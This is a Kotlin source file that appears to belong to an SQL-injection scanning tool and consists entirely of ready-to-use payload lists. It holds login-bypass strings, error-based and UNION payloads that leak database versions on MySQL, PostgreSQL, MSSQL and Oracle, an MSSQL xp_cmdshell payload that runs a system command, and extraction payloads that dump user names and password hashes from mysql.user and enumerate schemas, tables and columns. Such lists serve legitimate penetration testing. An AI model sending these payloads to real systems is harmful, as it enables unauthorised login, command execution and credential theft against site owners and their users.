package com.sqliblackboxpro

object SQLPayloads {
    
    // Basic SQL injection payloads for detection
    val DETECTION_PAYLOADS = listOf(
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1"
    )
    
    // Database-specific error-based payloads
    val MYSQL_PAYLOADS = listOf(
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' AND updatexml(null,concat(0x0a,version()),null)-- "
    )
    
    val POSTGRESQL_PAYLOADS = listOf(
        "' AND 1=CAST((SELECT VERSION()) AS INT)--",
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' AND 1::int=1 AND ''='"
    )
    
    val MSSQL_PAYLOADS = listOf(
        "' AND 1=CONVERT(INT,@@VERSION)--",
        "' UNION SELECT NULL,@@VERSION,NULL--",
        "'; EXEC xp_cmdshell('whoami')--"
    )
    
    val ORACLE_PAYLOADS = listOf(
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT BANNER FROM v$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,BANNER,NULL FROM v$version--"
    )
    
    // Data extraction payloads (for MySQL)
    val DATA_EXTRACTION_PAYLOADS = listOf(
        "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user--",
        "' UNION SELECT NULL,CONCAT(schema_name),NULL FROM information_schema.schemata--",
        "' UNION SELECT NULL,CONCAT(table_name),NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--"
    )
    
    // Get all payloads for comprehensive scanning
    fun getAllPayloads(): List<String> {
        return DETECTION_PAYLOADS + MYSQL_PAYLOADS + POSTGRESQL_PAYLOADS + 
               MSSQL_PAYLOADS + ORACLE_PAYLOADS
    }
}
